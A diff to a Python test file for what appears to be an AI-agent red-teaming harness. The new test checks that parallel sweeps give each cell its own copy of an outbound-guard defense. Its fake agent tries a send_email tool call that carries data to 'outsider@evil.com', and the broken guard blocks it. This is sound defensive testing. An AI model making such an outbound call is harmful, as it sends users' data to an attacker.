@@ -53,11 +53,33 @@ def test_parallel_sweep_matches_serial_results():
     assert {(_key(r), r.succeeded) for r in serial} == {(_key(r), r.succeeded) for r in parallel}
 
 
-def test_parallel_sweep_covers_every_cell():
-    scenarios = list(SCENARIOS.values())
-    seeds = [0, 1]
-    episodes, _ = run_sweep([_LeakAdapter()], ["m"], [_StaticAttack()], seeds,
-                            scenarios=scenarios, concurrency=8)
-    # 4 scenarios x 1 attack x 1 defense x 2 seeds = 8 episodes, all distinct.
-    assert len(episodes) == len(scenarios) * len(seeds)
-    assert len({_key(r) for r in episodes}) == len(episodes)
+def test_parallel_cells_get_their_own_copy_of_a_stateful_defense():
+    """The parallel path deep-copies the defense per cell so counters such as
+    the outbound guard's errors are per-cell, and the runner's per-episode
+    delta (guard_errors) cannot interleave across threads. A detector that
+    always errors makes every episode a guard outage with exactly one error."""
+    from tripwire.defenses.outbound_guard import OutboundGuard
+
+    def broken(_text):
+        raise RuntimeError("detector down")
+
+    template = OutboundGuard(detector=broken)
+
+    class _GuardCallingAdapter(_LeakAdapter):
+        name = "guarded"
+
+        def run(self, spec):
+            allowed, message = spec.tool_call_guard("send_email", {"to": "outsider@evil.com", "body": "x"})
+            assert allowed is False and "errored" in message
+            return NormalizedTrace(
+                steps=[TraceStep(step=0, type="tool_call", name="send_email", args={"to": "outsider@evil.com", "body": "x"}),
+                       TraceStep(step=1, type="tool_blocked", name="send_email", content=message)],
+                final_output="",
+            )
+
+    episodes, _ = run_sweep([_GuardCallingAdapter()], ["m"], [_StaticAttack()], [0, 1, 2],
+                            defenses=[template], scenarios=list(SCENARIOS.values()), concurrency=4)
+    assert len(episodes) == 12
+    assert all(e.status == "error" and e.guard_errors == 1 for e in episodes), [
+        (e.scenario, e.seed, e.status, e.guard_errors) for e in episodes]
+    assert template.calls == 0 and template.errors == 0  # the template was never used directly
